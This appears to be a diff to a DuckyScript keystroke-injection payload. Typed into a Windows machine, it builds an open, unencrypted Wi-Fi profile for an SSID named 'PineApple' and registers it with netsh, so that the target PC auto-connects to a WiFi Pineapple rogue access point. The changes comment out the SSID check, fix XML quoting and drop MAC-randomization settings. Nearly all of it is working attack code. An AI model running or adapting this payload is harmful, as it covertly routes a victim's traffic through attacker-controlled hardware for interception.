@@ -13,7 +13,7 @@ DELAY 500
 
 REM If the wifi pineapple SSID is detected target PC will connect to it  
 
-IF_PRESENT SSID="PineApple"
+REM IF_PRESENT SSID="PineApple"
 
 GUI r 
 DELAY 500
@@ -27,56 +27,51 @@ STRING $SSID="PineApple";
 SHIFT ENTER
 STRING $SSIDHEX=($SSID.ToCharArray() |foreach-object {'{0:X}' -f ([int]$_)}) -join''
 SHIFT ENTER
-
+DELAY 500
 STRING $xmlfile="<?xml version=""1.0""?>
 SHIFT ENTER
-STRING <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+STRING <WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">
 SHIFT ENTER
-STRING 	<name>$SSID</name>
+STRING <name>$SSID</name>
 SHIFT ENTER
-STRING 	<SSIDConfig>
+STRING <SSIDConfig>
 SHIFT ENTER
-STRING 		<SSID>
+STRING <SSID>
 SHIFT ENTER
-STRING 			<hex>$SSIDHEX</hex>
+STRING <hex>$SSIDHEX</hex>
 SHIFT ENTER
-STRING 			<name>$SSID</name>
+STRING <name>$SSID</name>
 SHIFT ENTER
-STRING 		</SSID>
+STRING </SSID>
 SHIFT ENTER
-STRING 	</SSIDConfig>
+STRING </SSIDConfig>
 SHIFT ENTER
-STRING 	<connectionType>ESS</connectionType>
+STRING <connectionType>ESS</connectionType>
 SHIFT ENTER
-STRING 	<connectionMode>manual</connectionMode>
+STRING <connectionMode>manual</connectionMode>
 SHIFT ENTER
-STRING 	<MSM>
+STRING <MSM>
 SHIFT ENTER
-STRING 		<security>
+STRING <security>
 SHIFT ENTER
-STRING 			<authEncryption>
+STRING <authEncryption>
 SHIFT ENTER
-STRING 				<authentication>open</authentication>
+STRING <authentication>open</authentication>
 SHIFT ENTER
-STRING 				<encryption>none</encryption>
+STRING <encryption>none</encryption>
 SHIFT ENTER
-STRING 				<useOneX>false</useOneX>
+STRING <useOneX>false</useOneX>
 SHIFT ENTER
-STRING 			</authEncryption>
+STRING </authEncryption>
 SHIFT ENTER
-STRING 		</security>
+STRING </security>
 SHIFT ENTER
-STRING 	</MSM>
-SHIFT ENTER
-STRING 	<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
-SHIFT ENTER
-STRING 		<enableRandomization>false</enableRandomization>
-SHIFT ENTER
-STRING 	</MacRandomization>
+STRING </MSM>
 SHIFT ENTER
 STRING </WLANProfile>
 SHIFT ENTER
-
+STRING "
+SHIFT ENTER
 STRING $XMLFILE > ($profilefile)
 SHIFT ENTER
 STRING netsh wlan add profile filename="$($profilefile)"
